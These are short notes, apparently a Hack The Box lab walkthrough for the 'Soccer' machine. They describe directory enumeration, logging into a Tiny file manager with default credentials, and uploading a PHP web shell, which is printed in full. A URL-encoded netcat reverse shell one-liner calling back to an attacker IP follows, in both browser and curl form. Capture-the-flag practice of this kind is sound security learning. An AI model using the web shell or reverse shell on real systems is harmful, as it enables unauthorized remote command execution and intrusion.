 ```
 gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 /tiny got login form
 
 google default credential for h3k mini file manager
 
 upload php backdoor to /tiny/uploads folder
 
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 
 
 http://soccer.htb/tiny/uploads/test.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.49%206789%20%3E%2Ftmp%2Ff
 
 alternative :
 curl "http://soccer.htb/tiny/uploads/test.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.49%206789%20%3E%2Ftmp%2Ff"

ls -l /etc/nginx/sites-enabled

soc-player.soccer.htb

register and login and you will see a ticket checking , likely using sql
 ```
 https://www.hackthebox.com/achievement/machine/336799/519
